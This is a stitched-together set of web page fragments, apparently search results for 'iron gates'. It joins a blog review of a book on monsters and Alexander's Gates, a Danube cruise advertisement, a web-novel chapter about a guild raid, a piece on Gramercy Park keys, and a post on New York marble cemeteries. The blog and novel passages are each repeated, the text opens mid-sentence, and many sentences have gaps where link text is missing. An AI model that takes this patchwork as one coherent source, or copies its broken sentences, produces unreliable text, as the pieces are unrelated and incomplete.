creatures do not live there locally, and they will follow it until it reveals its narrow passageway between the    <b>gates</b>. The cursed sons of Cain will finally burst forth from the    <b>gates</b>, and the realm of the reprobate will be emptied into the apocalyptic world.   </blockquote>   <p>In any case, the idea that the line between <i>human</i> and <i>not-human</i> has been represented in myth and religion as a very specifically architectural form&#x2014;that is, a literal wall built high in the mountains, far away&#x2014;is absolutely fascinating to me. </p>   <p>Further, it&#x2019;s not hard to wonder how Alexander&#x2019;s <b>Gates</b> compare, on the level of imperial psychology, to things like the Great Wall of China, the Berlin Wall, the U.S./Mexico border fence, or the &#x2014;even London&#x2019;s &#x2014;let alone the in Tolkien&#x2019;s . </p>   <p><small>[Image: A map of the , an electromagnetic Alexander&#x2019;s <b>Gates</b> for the Cold War].</small></p>   <p>Perhaps there is a kind of theological waiting to be written about the Wall of Gog and Magog.</p>   <p>Or could someone produce an architectural history of border stations as described in world mythology?

Orsova is well-known for having two hydroelectric dams, with two power stations, <b>Iron</b> Gate I Hydroelectric Power Station and <b>Iron</b> Gate II Hydroelectric Power Station.</p>   <h2>Derdap National Park</h2>   <p>The <b>Iron</b> <b>Gates</b> gorge, towards its Romanian side, constitutes the <b>Iron</b> <b>Gates</b> natural park, whereas towards its Serbian part, it constitutes the &#x110;erdap national park. In Serbia, the gorge is popular by the name &#x110;erdap (&#x402;&#x435;&#x440;&#x434;&#x430;&#x43f;), with the last part named &#x110;erdapska klisura.</p>   <p>Originally, the <b>Iron</b> <b>Gates</b> comprised of four narrow gorges and three wide basins expanded over several miles of the river dividing Romania and Serbia. In order to control the speed of the river and make sailing though this part of the Danube River safer, a huge lock and dam was built in the 1960s. Presently, the river flowing through the <b>Iron</b> <b>Gates</b> is peaceful, and it is 130 feet higher than earlier to the dam and power station.</p>   <p>While cruising in Hungary, as you journey from Budapest to <b>Iron</b> <b>Gates</b>, you will enjoy watching the stunning landscapes and historic towns along the way. As you cruise through the <b>Iron</b> <b>gates</b> of the Danube, you will have an amazing experience of some of the most spectacular scenery that Danube has to offer.</p>   <p>Book your vacation on our Danube River cruise and enjoy watching the wonders of the beautiful <b>Iron</b> <b>Gates</b> gorge from the comforts of our cruise!</p>   <p>For more information contact: Europeanbarging, 888-869-7907, jan@europeanbarging.com</p>  </div>

   <div>   <p>[] &#xa0;[] &#xa0;[] </p>   <p>Chapter 272: Death of the Seven Knights</p>   <p>&#x201c;Young man&#x2026;&#x2026;&#x201d;</p>   <p>One of the captains smiled and patted my shoulder, &#x201c;You are still too soft. A commoner&#x2019;s life means nothing compared to the benefits of thousands of people. You&#x2019;ll slowly understand. As for us&#x2026;haha&#x2026;we can only give our best efforts&#x2026;..&#x201d;</p>   <p>I nodded, &#x201c;Yea!&#x201d;</p>   <p>&#x2026;&#x2026;.</p>   <p>Although we stayed until dawn, we were still unable to figure anything out, as everything about Blood Scythes seemed so mysterious. Police intervention would be too susceptible, which restrained Wang Xin from being able to act. As for me, I couldn&#x2019;t help at all, and could only spend 24hrs waiting for orders.</p>   <p>After Shen Bing helped me change my bandages again, I returned to Liu Hua University at 2:00AM, and fell into a deep sleep.</p>   <p>It was already around 10:00am when I woke up. I got up and called Wan Er to arrange to have lunch together at 11:00AM. I then cooled myself with a cold shower to keep myself calm for the impending great challenge of the game. The God of Commerce Badge was carried by the final BOSS in the City of the Ancients, and it was desired not just by [Zhan Long], but all the guilds of Ba Huang City. Whoever&#x2019;s fists are harder will be the one who gets it!&#x201d;</p>   <p>After breakfast, it was 11:45AM. I returned to the dorm, and went online!</p>   <p>&#x2026;. &#x201c;Shua !&#x201d;</p>   <p>I appeared in Ba Huang City and immediately received a message from Wolf saying, &#x201c;Brother Xiao Yao, we have prepared. We&#x2019;re awaiting your commands outside the north gate of Ba Huang City. &#x201d;</p>   <p>&#x201c;Alright. I&#x2019;m on my way now! &#x201d;</p>   <p>With a wave of my hand, the Flaming Tiger God emerged from a golden hexagram with a growl. It instantly snuggled around me like a kitten and purred contently, its behavior not quite matching its mighty physique.</p>   <p>Time was precious. After I rushed out of the city, I saw from afar, Yue Qing Qian, Wolf, Matcha, Li Mu and the others, standing there. I could also see the hundreds of [Zhan Long] &#x2018;s elite players waiting there. Almost all the guilds&#x2019; players had set off together, just for the City of the Ancients!</p>   <p>I came forward and asked, &#x201c;Have the coordinates refreshed yet?!&#x201d;</p>   <p>Yue Qing Qian shook her head, &#x201c;They&#x2019;re still not confirmed!&#x201d;</p>   <p>Wolf answered, &#x201c;It should be soon. Ba Huang City&#x2019;s forum is in an uproar. Nobody knows the exact coordinates of the City of the Ancients, and many guilds have already dispatched people to search each map individually.&#x201d;</p>   <p>Li Mu smiled, &#x201c;No worries. After the City of the Ancients refreshes, 10 waves of monsters will be out for slaughter. We will have plenty of chances. Even if someone else finds it first, that doesn&#x2019;t mean that they will be able to slay the final boss and obtain the God of Commerce Badge&#x2026;&#x201d;</p>   <p>I nodded and smiled, &#x201c;Yup, stay calm. &#x201d;</p>   <p>Just then, the ground suddenly shook and shook, causing millions of birds to fly out from Ba Huang Forest. The north was entirely bathed in a golden glow; something had happened in the forest. Looking from afar, a towering shabby ancient city appeared in the heart of the forest, around 1000 meters away from us, just within our sight. Lucky! Just as we had suspected, the City of the Ancients was near Ba Huang City!</p>   <p>&#x201c;Ding! &#x201d;</p>   <p>System Notice: &#x201c;Greetings Player. You have appeared within 2000 meters of Ba Huang City&#x2019;s [City of the Ancients]. Before the City of the Ancients is attacked, players in the surrounding area will not be able to revive. Please cherish your life, as you only have one!&#x201d; &#x2026;&#x2026;</p>   <p>&#x201c;F*ck!&#x201d; Li Mu looked around, &#x201c;When the City of the Ancients appears, we can&#x2019;t revive, so does that mean&#x2026;&#x2026; that we can&#x2019;t use the human wave tactic on this map?&#x201d;</p>   <p>Wang Jian laughed, &#x201c;This type of map is more fun, right?</p>   <p>Old K clenched his fist and laughed, &#x201c;Right, it&#x2019;s more exciting this way.&#x201d;</p>   <p>&#x201c;Exciting my ass&#x2026;..&#x201d; I gave him a glance. &#x201c;I&#x2019;ll be beyond thankful if you just manage to survive just a bit longer; don&#x2019;t go jumping into a group of mobs and getting killed. We still need your strength when it comes to the last BOSS!&#x201d;</p>   <p>Holding his Haunted Twinblade Battleaxe, Old K laughed, &#x201c;Don&#x2019;t worry Li brat, I won&#x2019;t go down so easily. Look, I&#x2019;m already Lv 61&#x2026;..&#x201d;</p>   <p>&#x201c;Okay&#x2026;&#x2026;&#x201d;</p>   <p>&#x201c;Brother Xiao Yao&#x2026;&#x2026;&#x201d; Yue Qing Qian whispered by my side.</p>   <p>&#x201c;What&#x2019;s wrong, Qing Qian?&#x201d; I laughed</p>   <p>Yue Qing Qian blinked and then smiled, &#x201c;This is a chance for us to establish ourselves&#x2026;.. the City of the Ancients is a large-scale event. The amount of experience obtained from these monsters is far superior than those gained from average monsters. We have to call all of our guild, since all the experience we earn here will turn into experience for the guild as well. Maybe this City of the Ancients will help us finally break through into becoming a Level 4 guild. Today, [Zhan Long] will rush to Level 4 and fill up all 3000 member slots. Then we will have enough confidence to back up our words!&#x201d;</p>   <p>At ease, I patted her shoulders, &#x201c;Yeah. We have to work hard and break through to Level 4 today. Let&#x2019;s move out!&#x201d;</p>   <p>Li Mu raised his sword into the air, &#x201c;Brothers, move out! Don&#x2019;t break the formation!&#x201d;</p>   <p>A group of people rushed forwards. In less than 10 minutes, the 850+ members of [Zhan Long] were in front of the City of the Ancients!</p>   <p>&#x2026;&#x2026;</p>   <p>Lifting my head to look at the city, I could see why this was called the City of the Ancients. The city walls were full of battle scars. Due to weathering and eroding, the many catapults were full of damage as well. The <b>gates</b> were also full of sword marks. The majestic city walls were 50 meters high, with many elite archers on top. With superior armor and golden looking arrows, these archers gave off a frightening feeling.</p>   <p>In the city, there were some Ba Huang City players approaching us on the map. Because the <b>gates</b> hadn&#x2019;t opened yet, the first wave of monsters had not appeared.</p>   <p>Li Mu furrowed his brows, &#x201c;Xiao Yao, what do we do? Do we storm in, or&#x2026;.?&#x201d;</p>   <p>I looked at the elite archers on the city walls and said, &#x201c;Right now, we can&#x2019;t clearly determine the NPC&#x2019;s level, so we shouldn&#x2019;t act rashly. We&#x2019;ll move to the northern part of the City of the Ancients. There, we&#x2019;ll position ourselves about 50-100 meters from the gate and wait for the monsters to come out. Right now, nobody has attempted to besiege the city yet, so we shouldn&#x2019;t either&#x201d;</p>   <p>&#x201c;Okay!&#x201d;</p>   <p>A large group detoured to the northern <b>gates</b>. There were not many players here. Since the southern gate was facing Ba Huang City, occupying this position would do us only good and no harm.</p>   <p>&#x201c;Knights and Monks, go to the front line. Prepare a line of defense!&#x201d; I commanded.</p>   <p>Including Matcha, the group went forward, and with their shields, they formed a defensive line. In the rear, we had Musketeers and Archers. This was the standard formation.</p>   <p>&#x201c;Brother Xiao Yao, we&#x2019;re not being too cautious, are we?&#x201d; Wolf looked at the city and laughed.</p>   <p>I shook my head, &#x201c;No, I feel like those elite archers are very strong. We might even suffer heavy losses to them. Moreover, being a bit more cautious is not a bad thing. We only live once on this map; we should cherish our lives.&#x201d;</p>   <p>&#x201c;Yeah, you&#x2019;re right!&#x201d; &#x2026;&#x2026;</p>   <p>After a few minutes, a huge group of players arrived. Many guilds and individual players came to build up their defenses. The closest group of players were from [Flying Dragon], players like Soaring Dragon, Fierce Tiger, Black Tortoise, Drunken Spear and Mu Tian. [Flying Dragon] had over 5000 players, and they had vast amounts of fame and power behind them. The dense mass of players occupied over 300 meters of field, meaning that over 50% of the northern area had been filled up. It looked like each and every single one of them wanted to play an active role in the upcoming battle for City of the Ancients.</p>   <p>Besides those from [Flying Dragon], countless smaller guilds and teams that could not be differentiated from each other, were lined up. Fortunately, [Zhan Long] had a 3 meter gap on both sides, separating us from the others.</p>   <p>&#x201c;For us to end up going in the same direction as [Zhan Long]&#x2026;&#x201d; Fierce Tiger clenched his battleaxe with a look of disdain, &#x201c;They only have 800 people, who knows how long they can last? Hehe, I hope they don&#x2019;t die too quickly, otherwise they&#x2019;ll become a joke.&#x201d;</p>   <p>Drunken Spear whirled his spear and said, &#x201c;Don&#x2019;t belittle them too much, Xiao Yao Zi Zai has always emerged victorious when he has taken command. [Vanguard] and [Hero&#x2019;s Mound] both had their attacks thwarted by [Zhan Long]; a guild like that should have our respect, not our contempt. I propose&#x2026;that we should get close to [Zhan Long], maybe even collaborate together&#x2026;&#x201d;</p>   <p>Soaring Dragon waved his hand in anger, &#x201c;No need; as long as Drunken Spear protects us, we will be fine!&#x201d;</p>   <p>Drunken Spear rubbed at his nose in exasperation, &#x201c;Alright, relying on me isn&#x2019;t bad either. Let&#x2019;s work hard and hope that we get the God of Commerce Badge. We cannot let [Vanguard] or [Prague] get their hands on it first!&#x201d;</p>   <p>&#x201c;Yea, ok!&#x201d;</p>   <p>Mu Tian lifted his own spear and looked at the city, &#x201c;Eh? Why hasn&#x2019;t the first wave of monsters come out yet; are they stuck or something? Did the city block them in? It&#x2019;s already 12:30, shouldn&#x2019;t they have technically come out by now? If not, then let&#x2019;s have a group of players enter the city and investigate the monsters that are inside. Perhaps the activation conditions only occur when people enter the city?&#x201d;</p>   <p>Soaring Dragon&#x2019;s staff emitted dense rays of bright light. He anxiously nodded his head and said, &#x201c;Sounds good. Send some of the faster, but more tanky Knights to enter the city.&#x201d;</p>   <p>&#x201c;Understood!&#x201d;</p>   <p>&#x2026;&#x2026;</p>   <p>After a few minutes, 7 Knights came forward with spears and swords in hand. [Flying Dragon] was the biggest force currently defending themselves around the City of the Ancients, as well as having the most say in things. So while countless players looked on, the 7 Knights entered the city with a prideful arrogance.</p>   <p>&#x201c;Shall we knock?&#x201d;</p>   <p>&#x201c;Yes!&#x201d;</p>   <p>One of the players charged forward and struck at the <b>iron</b> doors with his shield!</p>   <p>&#x201c;Keng!&#x201d;</p>   <p>The door reverberated with a loud gong similar to that of a grand clock as a Knight said, &#x201c;It looks like&#x2026;like there&#x2019;s no response?&#x201d;</p>   <p>&#x201c;That&#x2019;s not right, I swear there&#x2019;s some movement inside&#x2026;&#x201d;</p>   <p>&#x201c;Eh?&#x201d;</p>   <p>The 7 players quickly raised their heads, only to discover an entire row of NPC archers with longbows in their hands. In the next second, the sounds of bows being drawn and arrows being fired filled the air continuously. The golden arrowheads quickly pierced through the Knights&#x2019; battle armor, drawing blood. One by one, shocking damage numbers flew up from the Knights as they fell down in a spray of blood looking like porcupines. Not a single one managed to escape&#x2013;</p>   <p>2837&#xff01; 2981&#xff01; 3004&#xff01; 2785&#xff01;</p>   <p>&#x2026;&#x2026;</p>   <p>&#x201c;F*ck!&#x201d; Soaring Dragon shook his fist in the air and roared, &#x201c;What level are those NPC archers? How can they have such high damage?&#x201d;</p>   <p>Drunken Spear stated, &#x201c;They have to be Lv 70 at the very least&#x2026;&#x201d;</p>   <p>Soaring Dragon was speechless.</p>   <p>&#x2026;&#x2026;</p>   <p>Seeing the 7 corpses, I laughed, &#x201c;Ai&#x2026;I can&#x2019;t even look at this sight&#x2026;&#x201d;</p>   <p>Wolf and Li Mu laughed with me.</p>   <p>Right at that moment, a creaking sound was suddenly heard as the <b>iron</b> <b>gates</b> began to open. A dense mass of monsters began to pour out from within; at last, the City of Ancients had officially started its first wave!</p>   <p>[] &#xa0;[] &#xa0;[] </p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>

   <div>   <p><em><strong>That&#x2019;s Some Key</strong></em> <em><strong>How Do You Get a Key to Gramercy Park?</strong></em></p>   <p>By <strong>ROBIN FINN</strong></p>   <p>THERE are 383 aspirational keys in circulation in the Big City, each of them numbered and coded, all of them equipped to unlock any of four wrought-<b>iron</b> <b>gates</b> offering privileged access to undisturbed siestas or tranquil ambulation inside the tree-lined boundaries of Gramercy Park.</p>   <p>At age 181, the only truly private park in Manhattan is lovelier and more ornamental than ever; yes, the colorful Calder sculpture swaying blithely in the breeze inside the fence is &#x201c;Janey Waney,&#x201d; on indefinite loan from the Calder Foundation.</p>   <p>Dogs may stare through the bars as mournfully as they like, but not even having a key-holder for a master will get them in.</p>   <p>A commemorative fountain and plaque dedicated to Samuel B. Ruggles, who in 1831 founded Gramercy Park.</p>   <p>Alexander Rower, a grandson of Mr. Calder, lives on Gramercy Park, as does Samuel G. White, whose great-grandfather was Stanford White, and who has taken on an advisory role in a major redesign of its landscaping. Both are key-holders who, validated by an impressive heritage, are exerting a significant influence on Gramercy Park&#x2019;s 21st-century profile. Because Gramercy is fenced, not walled in, the Calder and the rest of the evolving interior scenery are visible in all seasons to passers-by and the legions of dog-walkers who daily patrol the perimeter.</p>   <p>Parkside residents rationalize that their communal front yard is privatized for its own protection. Besides, they, not the city it enhances, have footed its bills for nearly two centuries. Any of the 39 buildings on the park that fails to pay the yearly assessment fee of $7,500 per lot, which grants it two keys &#x2014; fees and keys multiply accordingly for buildings on multiple lots &#x2014; will have its key privileges rescinded. The penalty is so painful that it has never had to be applied.</p>   <p>For connection-challenged mortals, though, the park is increasingly problematic to appreciate from within, particularly now that Arthur W. and William Lie Zeckendorf, and Robert A. M. Stern, the architect of their 15 Central Park West project, are recalibrating property values in a stratospheric direction by bringing the neighborhood its first-ever $42 million duplex penthouse, at 18 Gramercy Park South, formerly a Salvation Army residence for single women.</p>   <p>The unique housewarming gift the Zeckendorfs decided to bestow on the buyer-who-has-everything types purchasing there is none other than a small metallic item they might not already own: a personal key to the park.</p>   <p><span><strong>to be continued</strong></span></p>   <p>from </p>  </div>

(Yes, you read that right.)</p>   <p>In a few respects they are the Paris and Nicole of ancient burial grounds &#x2014; virtually identical and marked with occasional rivalries &#x2014; however these unique New York landmarks are literally all depth, little surface. For below the serene, manicured lawns of both places lie the crypts of hundreds of 19th century New York&#x2019;s leading families.</p>   <p>Before Green-Wood became the fashionable place to rest in peace, wealthy New Yorkers were lured to very first marble cemetery, opened in 1830. Unlike a traditional church cemetery, the New York Marble Cemetery (still listed at 41&#xbd; Second Avenue) was strictly a profit-generating venture of Perkins Nichols, who with a board of trustees purchased farmland funded by families already lined up to buy underground vaults.</p>   <p>Threats of disease during the early 1800s forced city officials to ban burials in lower Manhattan, below Canal Street. One of Nichols appeals was the Tuckahoe marble used to make the vaults; it was believed that disease was spread from traveling miasma which emanated from dead bodies, however the sturdy marble was believed to contain this effectively.</p>   <p>At $250 a pop, families could book themselves at this &#x201c;Place of Interment for Gentlemen,&#x201d; which eventually housed 156 vaults. The cemetery , as old moneyed families usually had their own family plots at their country homes. Today it looks like an out of place backyard with fresh green grass and a few trees. Vault markers are placed on the walls surrounding the lawn.</p>   <p>At the New York City Marble Cemetery a block away, the vault markers are affixed into the earth, sharing space with a few traditional grave markers. Trustees hired Nichols to open this plot a little less than a year later, in 1831, due to the success of the original. Not only is it a little larger &#x2014; with 258 vaults underfoot &#x2014; but it&#x2019;s readily viewed from Second Street through the bars of some very rustic <b>iron</b> <b>gates</b>.</p>   <p>Although New York Marble Cemetery was first, New York <em>City </em>Marble Cemetery held a loftier roster of permanent residents, including New York Public Library benefactor . Who you will no longer find here, however, is fifth president of the United States James Monroe, who was laid here at his death in 1831 and moved back to Virginia in 1858.</p>   <p>Below: the more dramatic New York City Marble Cemetery</p>   <p>Both cemeteries lost permanent inhabitants once Green-Wood opened, with families preferring to relocate their loved ones to the larger, more landscaped setting. In the 1890s, almost successfully petitioned to have the original marble cemetery turned into a children&#x2019;s playground, but the plan was later abandoned.</p>   <p>You can find more info at their official websites &#x2014; and .</p>   <p>I highly recommend swinging by either next time they&#x2019;re open. In fact, New York Marble Cemetery, hidden away through an alleyway and thus far more quiet, is even open for parties and events. Who wouldn&#x2019;t want to throw a wedding reception here?</p>  </div>

   <div>   <p>One of many books I&#x2019;ve been enjoying this autumn is by Stephen T. Asma, an extended look into where formal deviation occurs in the world and what unexpected, often emotionally disconcerting, shapes and forces can result. </p>   <p><small>[Image: The Dariel Pass in the Caucausus Mountains, rumored possible site of the mythic ].</small></p>   <p>According to Asma, measuring these swerves and abnormalities against each other&#x2014;and against ourselves&#x2014;can shed much-needed light on the alternative &#x201c;developmental trajectories&#x201d; by which monsters come into being. This <i>speculative monsterology</i>, as he describes it it, would thus uncover the rules by which even the most stunning mutational transformations occur&#x2014;allowing us to catalog extraordinary beings according to what Asma calls a &#x201c;continuum of strangeness: first, nonnative species, then familiar beasts with unfamiliar sizes or modified body parts, then hybrids of surprising combination, and finally, at the furthest margins, shape-shifters and indescribable creatures.&#x201d; Asma specifically mentions &#x201c;mosaic beings,&#x201d; beings &#x201c;grafted together or hybridized by nature or artifice.&#x201d; </p>   <p>In the book&#x2019;s fascinating first-third&#x2014;easily the book&#x2019;s best section&#x2014;Asma spends a great deal of time describing ancient myths of variation by which monsters were believed to have originated. From the mind-blowing and completely inexplicable discovery of dinosaur bones by ancient societies with no conception of geological time to the hordes of &#x201c;monstrous races&#x201d; believed to exist on the imperial perimeter, there have always been monsters somewhere in the world&#x2019;s geography.</p>   <p>Of specific relevance to an architecture blog, however, are . </p>   <p><small>[Image: Constructing the wall of Dhul-Qarnayn, mythic isotope to Alexander&#x2019;s Gates].</small></p>   <p>Alexander&#x2019;s Gates, Asma writes, were the ultimate wall between the literally Caucasian West and its monstrous opponents, dating back to Alexander the Great: </p>   <blockquote>    Alexander supposedly chased his foreign enemies through a mountain pass in the Caucasus region and then enclosed them behind unbreachable iron gates. The details and the symbolic significance of the story changed slightly in every medieval retelling, and it was retold often, especially in the age of exploration.    <p>(&#x2026;) The maps of the time, the <i>mappaemundi</i>, almost always include the gates, though their placement is not consistent. Most maps and narratives of the later medieval period agree that this prison territory, created proximately by Alexander but ultimately by God, houses the savage tribes of , who are referred to with great ambiguity throughout the Bible, and sometimes as individual monsters, sometimes as nations, sometimes as places.</p>   </blockquote>   <p>Beyond this wall was a &#x201c;monster zone.&#x201d;</p>   <p><small>[Image: The geography of Us vs. Them, in a &#x201c;12th century map by the Muslim scholar Al-Idrisi. &#x2018;Yajooj&#x2019; and &#x2018;Majooj&#x2019; (Gog and Magog) appear in Arabic script on the bottom-left edge of the Eurasian landmass, enclosed within dark mountains, at a location corresponding roughly to Mongolia.&#x201d; Via ].</small></p>   <p>Interestingly, a variation of this story is also told within Islam&#x2014;indeed, in the <i>Koran</i> itself. In Islamic mythology, however, Alexander the Great is replaced by a figure called (who might also be a legendary variation on the Persian king ).</p>   <p>Even more interesting than that, however, the <i>Koran</i>&#x2018;s own story of geographically distant monsters entombed behind a vast wall&#x2014;the border fence as theological infrastructure&#x2014;appears to be a kind of literary remix of the so-called . To quote that widely known religious authority , &#x201c;The story of Dhul-Qarnayn in the <i>Qur&#x2019;an</i>&#x2026; matches the Gog and Magog episode in the , which has caused some controversy among Islamic scholars.&#x201d; That is, the <i>Koran</i>, supposedly the exact and holy words of God himself, actually contains a secular myth from 3rd-century Greece. </p>   <p>The construction of Dhul-Qarnayn&#x2019;s wall against the non-Muslim monstrous hordes can specifically be found in verses 18:89-98. For instance: </p>   <blockquote>    &#x201c;&#x2026;Lend me a force of men, and I will raise a rampart between you and them. Come, bring me blocks or iron.&#x201d; He dammed up the valley between the Two Mountains, and said: &#x201c;Ply your bellows.&#x201d; And when the iron blocks were red with heat, he said: &#x201c;Bring me molten brass to pour on them.&#x201d; Gog and Magog could not scale it, nor could they dig their way through it.   </blockquote>   <p>Think of it as a kind of religious quarantine&#x2014;a biosafe wall through which no moral contagion could pass.</p>   <p><small>[Image: Constructing the wall of Dhul-Qarnayn, via ].</small></p>   <p>But as with all , and all , there will someday be a breach.</p>   <p>For instance, Asma goes on to cite a book, published in the 14th century, called the . There, we read how Alexander&#x2019;s Gates will, on some future day blackened by the full horror of monstrous return, be rendered completely obsolete: </p>   <blockquote>    In the end, Mandeville predicts, a lowly fox will bring the chaos of invading monsters upon the heads of the Christians. He claims, without revealing how he comes by such specific prophecy, that during the time of the Antichrist a fox will dig a hole through Alexander&#x2019;s gates and emerge inside the monster zone. The monsters will be amazed to see the fox, as such creatures do not live there locally, and they will follow it until it reveals its narrow passageway between the gates. The cursed sons of Cain will finally burst forth from the gates, and the realm of the reprobate will be emptied into the apocalyptic world.   </blockquote>   <p>In any case, the idea that the line between <i>human</i> and <i>not-human</i> has been represented in myth and religion as a very specifically architectural form&#x2014;that is, a literal wall built high in the mountains, far away&#x2014;is absolutely fascinating to me. </p>   <p>Further, it&#x2019;s not hard to wonder how Alexander&#x2019;s Gates compare, on the level of imperial psychology, to things like the Great Wall of China, the Berlin Wall, the U.S./Mexico border fence, or the &#x2014;even London&#x2019;s &#x2014;let alone the in Tolkien&#x2019;s . </p>   <p><small>[Image: A map of the , an electromagnetic Alexander&#x2019;s Gates for the Cold War].</small></p>   <p>Perhaps there is a kind of theological waiting to be written about the Wall of Gog and Magog.</p>   <p>Or could someone produce an architectural history of border stations as described in world mythology? I sense an amazing Ph.D. research topic here.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

   <div>   <p>[] &#xa0;[] &#xa0;[] </p>   <p>Chapter 272: Death of the Seven Knights</p>   <p>&#x201c;Young man&#x2026;&#x2026;&#x201d;</p>   <p>One of the captains smiled and patted my shoulder, &#x201c;You are still too soft. A commoner&#x2019;s life means nothing compared to the benefits of thousands of people. You&#x2019;ll slowly understand. As for us&#x2026;haha&#x2026;we can only give our best efforts&#x2026;..&#x201d;</p>   <p>I nodded, &#x201c;Yea!&#x201d;</p>   <p>&#x2026;&#x2026;.</p>   <p>Although we stayed until dawn, we were still unable to figure anything out, as everything about Blood Scythes seemed so mysterious. Police intervention would be too susceptible, which restrained Wang Xin from being able to act. As for me, I couldn&#x2019;t help at all, and could only spend 24hrs waiting for orders.</p>   <p>After Shen Bing helped me change my bandages again, I returned to Liu Hua University at 2:00AM, and fell into a deep sleep.</p>   <p>It was already around 10:00am when I woke up. I got up and called Wan Er to arrange to have lunch together at 11:00AM. I then cooled myself with a cold shower to keep myself calm for the impending great challenge of the game. The God of Commerce Badge was carried by the final BOSS in the City of the Ancients, and it was desired not just by [Zhan Long], but all the guilds of Ba Huang City. Whoever&#x2019;s fists are harder will be the one who gets it!&#x201d;</p>   <p>After breakfast, it was 11:45AM. I returned to the dorm, and went online!</p>   <p>&#x2026;. &#x201c;Shua !&#x201d;</p>   <p>I appeared in Ba Huang City and immediately received a message from Wolf saying, &#x201c;Brother Xiao Yao, we have prepared. We&#x2019;re awaiting your commands outside the north gate of Ba Huang City. &#x201d;</p>   <p>&#x201c;Alright. I&#x2019;m on my way now! &#x201d;</p>   <p>With a wave of my hand, the Flaming Tiger God emerged from a golden hexagram with a growl. It instantly snuggled around me like a kitten and purred contently, its behavior not quite matching its mighty physique.</p>   <p>Time was precious. After I rushed out of the city, I saw from afar, Yue Qing Qian, Wolf, Matcha, Li Mu and the others, standing there. I could also see the hundreds of [Zhan Long] &#x2018;s elite players waiting there. Almost all the guilds&#x2019; players had set off together, just for the City of the Ancients!</p>   <p>I came forward and asked, &#x201c;Have the coordinates refreshed yet?!&#x201d;</p>   <p>Yue Qing Qian shook her head, &#x201c;They&#x2019;re still not confirmed!&#x201d;</p>   <p>Wolf answered, &#x201c;It should be soon. Ba Huang City&#x2019;s forum is in an uproar. Nobody knows the exact coordinates of the City of the Ancients, and many guilds have already dispatched people to search each map individually.&#x201d;</p>   <p>Li Mu smiled, &#x201c;No worries. After the City of the Ancients refreshes, 10 waves of monsters will be out for slaughter. We will have plenty of chances. Even if someone else finds it first, that doesn&#x2019;t mean that they will be able to slay the final boss and obtain the God of Commerce Badge&#x2026;&#x201d;</p>   <p>I nodded and smiled, &#x201c;Yup, stay calm. &#x201d;</p>   <p>Just then, the ground suddenly shook and shook, causing millions of birds to fly out from Ba Huang Forest. The north was entirely bathed in a golden glow; something had happened in the forest. Looking from afar, a towering shabby ancient city appeared in the heart of the forest, around 1000 meters away from us, just within our sight. Lucky! Just as we had suspected, the City of the Ancients was near Ba Huang City!</p>   <p>&#x201c;Ding! &#x201d;</p>   <p>System Notice: &#x201c;Greetings Player. You have appeared within 2000 meters of Ba Huang City&#x2019;s [City of the Ancients]. Before the City of the Ancients is attacked, players in the surrounding area will not be able to revive. Please cherish your life, as you only have one!&#x201d; &#x2026;&#x2026;</p>   <p>&#x201c;F*ck!&#x201d; Li Mu looked around, &#x201c;When the City of the Ancients appears, we can&#x2019;t revive, so does that mean&#x2026;&#x2026; that we can&#x2019;t use the human wave tactic on this map?&#x201d;</p>   <p>Wang Jian laughed, &#x201c;This type of map is more fun, right?</p>   <p>Old K clenched his fist and laughed, &#x201c;Right, it&#x2019;s more exciting this way.&#x201d;</p>   <p>&#x201c;Exciting my ass&#x2026;..&#x201d; I gave him a glance. &#x201c;I&#x2019;ll be beyond thankful if you just manage to survive just a bit longer; don&#x2019;t go jumping into a group of mobs and getting killed. We still need your strength when it comes to the last BOSS!&#x201d;</p>   <p>Holding his Haunted Twinblade Battleaxe, Old K laughed, &#x201c;Don&#x2019;t worry Li brat, I won&#x2019;t go down so easily. Look, I&#x2019;m already Lv 61&#x2026;..&#x201d;</p>   <p>&#x201c;Okay&#x2026;&#x2026;&#x201d;</p>   <p>&#x201c;Brother Xiao Yao&#x2026;&#x2026;&#x201d; Yue Qing Qian whispered by my side.</p>   <p>&#x201c;What&#x2019;s wrong, Qing Qian?&#x201d; I laughed</p>   <p>Yue Qing Qian blinked and then smiled, &#x201c;This is a chance for us to establish ourselves&#x2026;.. the City of the Ancients is a large-scale event. The amount of experience obtained from these monsters is far superior than those gained from average monsters. We have to call all of our guild, since all the experience we earn here will turn into experience for the guild as well. Maybe this City of the Ancients will help us finally break through into becoming a Level 4 guild. Today, [Zhan Long] will rush to Level 4 and fill up all 3000 member slots. Then we will have enough confidence to back up our words!&#x201d;</p>   <p>At ease, I patted her shoulders, &#x201c;Yeah. We have to work hard and break through to Level 4 today. Let&#x2019;s move out!&#x201d;</p>   <p>Li Mu raised his sword into the air, &#x201c;Brothers, move out! Don&#x2019;t break the formation!&#x201d;</p>   <p>A group of people rushed forwards. In less than 10 minutes, the 850+ members of [Zhan Long] were in front of the City of the Ancients!</p>   <p>&#x2026;&#x2026;</p>   <p>Lifting my head to look at the city, I could see why this was called the City of the Ancients. The city walls were full of battle scars. Due to weathering and eroding, the many catapults were full of damage as well. The gates were also full of sword marks. The majestic city walls were 50 meters high, with many elite archers on top. With superior armor and golden looking arrows, these archers gave off a frightening feeling.</p>   <p>In the city, there were some Ba Huang City players approaching us on the map. Because the gates hadn&#x2019;t opened yet, the first wave of monsters had not appeared.</p>   <p>Li Mu furrowed his brows, &#x201c;Xiao Yao, what do we do? Do we storm in, or&#x2026;.?&#x201d;</p>   <p>I looked at the elite archers on the city walls and said, &#x201c;Right now, we can&#x2019;t clearly determine the NPC&#x2019;s level, so we shouldn&#x2019;t act rashly. We&#x2019;ll move to the northern part of the City of the Ancients. There, we&#x2019;ll position ourselves about 50-100 meters from the gate and wait for the monsters to come out. Right now, nobody has attempted to besiege the city yet, so we shouldn&#x2019;t either&#x201d;</p>   <p>&#x201c;Okay!&#x201d;</p>   <p>A large group detoured to the northern gates. There were not many players here. Since the southern gate was facing Ba Huang City, occupying this position would do us only good and no harm.</p>   <p>&#x201c;Knights and Monks, go to the front line. Prepare a line of defense!&#x201d; I commanded.</p>   <p>Including Matcha, the group went forward, and with their shields, they formed a defensive line. In the rear, we had Musketeers and Archers. This was the standard formation.</p>   <p>&#x201c;Brother Xiao Yao, we&#x2019;re not being too cautious, are we?&#x201d; Wolf looked at the city and laughed.</p>   <p>I shook my head, &#x201c;No, I feel like those elite archers are very strong. We might even suffer heavy losses to them. Moreover, being a bit more cautious is not a bad thing. We only live once on this map; we should cherish our lives.&#x201d;</p>   